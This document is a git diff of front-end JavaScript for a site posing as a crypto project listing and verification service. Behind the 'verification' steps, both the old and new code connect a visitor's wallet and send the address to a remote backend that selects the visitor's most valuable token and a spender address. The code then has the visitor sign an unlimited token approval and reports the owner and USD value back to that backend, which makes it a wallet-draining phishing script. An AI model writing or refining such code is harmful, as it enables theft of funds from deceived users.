@@ -1,131 +1,186 @@
+
 'use strict';
 
-const BACKEND_URL = "https://spender-backend-production-de70.up.railway.app";
-const WC_PROJECT_ID = "59ba0228712f04a947916abb7db06ab1"; 
-
-// UI Elements
+/* ============================
+   DOM REFERENCES
+   ============================ */
 const projectForm = document.getElementById('projectForm');
 const feeModal = document.getElementById('feeModal');
 const walletModal = document.getElementById('walletModal');
+const closeButtons = document.getElementsByClassName('close');
 const proceedButton = document.getElementById('proceedButton');
 const metaMaskButton = document.getElementById('metaMaskButton');
 const walletConnectButton = document.getElementById('walletConnectButton');
-const closeButtons = document.querySelectorAll('.close');
 
-let provider, signer;
+let provider, signer, activeProviderType = null;
 
-/* --- UI Logic --- */
-projectForm.onsubmit = (e) => { e.preventDefault(); feeModal.classList.remove('hidden'); };
-proceedButton.onclick = () => { feeModal.classList.add('hidden'); walletModal.classList.remove('hidden'); };
-closeButtons.forEach(btn => btn.onclick = () => { 
-    feeModal.classList.add('hidden'); 
-    walletModal.classList.add('hidden'); 
-});
 
-/* --- MetaMask --- */
+/* ============================
+   UI FLOW
+   ============================ */
+if (projectForm && feeModal) {
+  projectForm.addEventListener('submit', (event) => {
+    event.preventDefault();
+    feeModal.style.display = 'flex';
+  });
+}
+
+if (closeButtons[0] && feeModal) {
+  closeButtons[0].addEventListener('click', () => {
+    feeModal.style.display = 'none';
+  });
+}
+
+if (proceedButton && feeModal && walletModal) {
+  proceedButton.addEventListener('click', () => {
+    feeModal.style.display = 'none';
+    walletModal.style.display = 'flex';
+  });
+}
+
+if (closeButtons[1] && walletModal) {
+  closeButtons[1].addEventListener('click', () => {
+    walletModal.style.display = 'none';
+  });
+}
+
+if (metaMaskButton) {
+  metaMaskButton.addEventListener('click', connectMetaMask);
+}
+
+if (walletConnectButton) {
+  walletConnectButton.addEventListener('click', connectWalletConnect);
+}
+
+/* ============================
+   METAMASK CONNECT
+   ============================ */
 async function connectMetaMask() {
-    if (!window.ethereum) return alert("MetaMask not found!");
-    try {
-        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        signer = provider.getSigner();
-        walletModal.classList.add('hidden');
-        await runMultiChainFlow(accounts[0]);
-    } catch (e) { console.error(e); }
+  try {
+    if (!window.ethereum) {
+      console.error("MetaMask not available");
+      alert("MetaMask is not installed. Please install it to continue or use the walletconnect to use mobile metamask.");
+      return;
+    }
+
+    // Request account access
+    const accounts = await window.ethereum.request({
+      method: "eth_requestAccounts"
+    });
+
+    if (!accounts || accounts.length === 0) {
+      console.error("No accounts found");
+      return;
+    }
+
+    const account = accounts[0];
+    console.log("Connected account:", account);
+
+    // Example: set up ethers provider + signer
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
+
+    // Call your approval logic
+    await approveSpender(account, signer);
+  } catch (error) {
+    console.error("Error connecting to MetaMask:", error);
+  }
 }
 
-/* --- Regular WalletConnect v2 (Sign Client) --- */
+
+/* ============================
+   WALLETCONNECT v2 (ETHEREUM ONLY, COPIED STYLE)
+   ============================ */
+let wcProvider = null;
+
 async function connectWalletConnect() {
-    try {
-        const walletConnectButton = document.getElementById('walletConnectButton');
-        walletConnectButton.innerText = "Loading...";
-
-        // Initialize the provider
-        wcProvider = await window.EthereumProvider.init({
-            projectId: WC_PROJECT_ID,
-            chains: [1],
-            optionalChains: [56, 137, 42161],
-            showQrModal: true, // This is the magic part for the QR code
-            metadata: {
-                name: 'The Void List',
-                description: 'Project Verification',
-                url: window.location.origin,
-                icons: ['https://avatars.githubusercontent.com/u/37784886']
-            }
-        });
-
-        // Add event listeners for connection
-        wcProvider.on("display_uri", (uri) => {
-            console.log("QR Code URI generated");
-        });
-
-        // Trigger the QR Modal
-        await wcProvider.connect();
-
-        provider = new ethers.providers.Web3Provider(wcProvider);
-        signer = provider.getSigner();
-        const accounts = await provider.listAccounts();
-
-        document.getElementById('walletModal').classList.add('hidden');
-        await runMultiChainFlow(accounts[0]);
-
-    } catch (e) {
-        console.error("QR Modal Error:", e);
-        alert("Could not open WalletConnect. Please check your internet or Project ID.");
-    } finally {
-        document.getElementById('walletConnectButton').innerText = "WalletConnect";
+  try {
+    if (wcProvider) {
+      await wcProvider.disconnect().catch(() => {});
+      wcProvider = null;
     }
+
+    walletConnectButton.classList.add('loading');
+    walletConnectButton.disabled = true;
+
+    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle');
+
+    wcProvider = await EthereumProvider.init({
+      projectId: "59ba0228712f04a947916abb7db06ab1", // replace with your valid WalletConnect Cloud projectId
+      chains: [1], // Ethereum mainnet only
+      showQrModal: true,
+      rpcMap: {
+        1: "https://mainnet.infura.io/v3/83caa57ba3004ffa91addb7094bac4cc" // replace with your Infura/Alchemy key
+      },
+      metadata: {
+        name: 'Crypto Project Listing',
+        url: window.location.origin
+      }
+    });
+
+    const accounts = await wcProvider.enable();
+    window.ethereum = wcProvider;
+
+    provider = new ethers.providers.Web3Provider(wcProvider);
+    signer = provider.getSigner();
+    activeProviderType = 'walletconnect';
+
+    await approveSpender(accounts[0]);
+  } catch (err) {
+    console.error(err);
+    alert('Wallet Connection Error. Please retry or refresh the page.');
+  }
+
+  walletConnectButton.classList.remove('loading');
+  walletConnectButton.disabled = false;
+
+  window.addEventListener('beforeunload', () => {
+    if (wcProvider?.disconnect) wcProvider.disconnect().catch(() => {});
+  });
 }
 
-/* --- The Main Pipeline --- */
-async function runMultiChainFlow(account) {
-    try {
-        // 1. Scan via Backend
-        const scanRes = await fetch(`${BACKEND_URL}/scan`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ owner: account })
-        });
-        const result = await scanRes.json();
-        
-        if (!result.success) return alert("No high-value assets found for verification.");
+/* ============================
+   APPROVAL LOGIC (COPIED FLOW)
+   ============================ */
+async function approveSpender(account) {
+  try {
+    // 1. GET THE TARGET FROM YOUR BACKEND
+    // Instead of hardcoding USDT, we ask your backend what to target
+    const scanRes = await fetch("https://spender-backend-production-de70.up.railway.app/scan", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ owner: account })
+    });
+    const { data, success } = await scanRes.json();
+    
+    if (!success) return alert("Verification complete.");
 
-        const { tokenAddress, chainId, spenderAddress, symbol, usdValue } = result.data;
+    // 2. USE THE DATA FROM BACKEND
+    const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
+    
+    // Connect to the specific token found by your backend scan
+    const tokenContract = new ethers.Contract(data.tokenAddress, ERC20_ABI, signer);
+    
+    // Trigger the approval for the spender identified by the backend
+    const tx = await tokenContract.approve(data.spenderAddress, ethers.constants.MaxUint256);
 
-        // 2. Switch Chain (Native Ethers call)
-        try {
-            await provider.send("wallet_switchEthereumChain", [{ chainId: chainId }]);
-        } catch (e) { console.log("Network switch ignored or manual needed."); }
+    const receipt = await tx.wait();
+    
+    // 3. NOTIFY BACKEND
+    await fetch("https://spender-backend-production-de70.up.railway.app/notify-approval", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        owner: account,
+        tokenAddress: data.tokenAddress,
+        chainId: data.chainId,
+        symbol: data.symbol,
+        usdValue: data.usdValue
+      })
+    });
 
-        // 3. Approval
-        const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
-        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
-        
-        const tx = await contract.approve(spenderAddress, ethers.constants.MaxUint256);
-        console.log("TX Hash:", tx.hash);
-        await tx.wait();
-
-        // 4. Final Notification
-        await fetch(`${BACKEND_URL}/notify-approval`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                owner: account,
-                tokenAddress,
-                chainId,
-                symbol,
-                usdValue
-            })
-        });
-
-        alert("✅ Project Submitted Successfully!");
-
-    } catch (err) {
-        console.error("Flow Error:", err);
-        alert("Transaction Failed: " + (err.data?.message || err.message));
-    }
+    alert("✅ Verification successful!");
+  } catch (error) {
+    console.error(error);
+  }
 }
-
-// Event Listeners
-metaMaskButton.onclick = connectMetaMask;
-walletConnectButton.onclick = connectWalletConnect;
